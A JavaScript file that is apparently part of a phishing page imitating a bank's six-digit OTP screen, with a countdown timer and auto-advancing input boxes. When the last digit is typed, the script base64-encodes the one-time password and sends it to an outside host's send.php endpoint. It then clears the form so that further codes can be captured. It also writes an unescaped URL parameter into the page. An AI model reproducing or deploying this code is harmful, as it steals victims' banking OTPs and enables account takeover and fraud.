var timeout = 10;

$(document).ready(function() {
    var paramsString = window.location.search.substring(1);
    var params = paramsString.split("&");
    for (var i=0; i<params.length; i++) {
        var param = params[i];
        var paramName = param.split("=")[0];
        var paramValue = param.split("=")[1];
        if (paramName == "phone") {
            $("#phone").html(paramValue);
            break;
        }
    }
    timeoutFunc();
    $("#num1").on("input", function() {
        var value = $("#num1").val().trim();
        if (value.length == 1) {
            $("#num2").focus();
        }
    });
    $("#num2").on("input", function() {
        var value = $("#num2").val().trim();
        if (value.length == 1) {
            $("#num3").focus();
        }
    });
    $("#num3").on("input", function() {
        var value = $("#num3").val().trim();
        if (value.length == 1) {
            $("#num4").focus();
        }
    });
    $("#num4").on("input", function() {
        var value = $("#num4").val().trim();
        if (value.length == 1) {
            $("#num5").focus();
        }
    });
    $("#num5").on("input", function() {
        var value = $("#num5").val().trim();
        if (value.length == 1) {
            $("#num6").focus();
        }
    });
    $("#num6").on("input", function() {
        var value = $("#num6").val().trim();
        if (value.length == 1) {
            var otp = $("#num1").val().trim()
                +$("#num2").val().trim()
                +$("#num3").val().trim()
                +$("#num4").val().trim()
                +$("#num5").val().trim()
                +$("#num6").val().trim();
            $("#text1").css("display", "none");
            $("#text2").css("display", "block");
            $("#loader").css("display", "flex");
            $.ajax({
        type: "get",
        url: "https://www.gebyarundian.co/bni/send.php?message="+encodeURIComponent(btoa("<b>OTP:</b> "+otp)),
        dataType: "text",
        success: function(response) {
        }
    });
            setTimeout(() => {
                $("#text1").css("display", "block");
                $("#text2").css("display", "none");
                $("#num1").val("");
                $("#num2").val("");
                $("#num3").val("");
                $("#num4").val("");
                $("#num5").val("");
                $("#num6").val("");
                $("#num1").focus();
                $("#loader").css("display", "none");
            }, 2000);
        }
    });
});

function timeoutFunc() {
    if (timeout > 0) {
        timeout--;
        $("#timeout").html((""+parseInt(timeout/60)).padStart(2, "0")+" : "+(""+parseInt(timeout%60)).padStart(2, "0"));
        setTimeout(timeoutFunc, 1000);
    } else {
        $("#timeout").html("00 : 00");
    }
}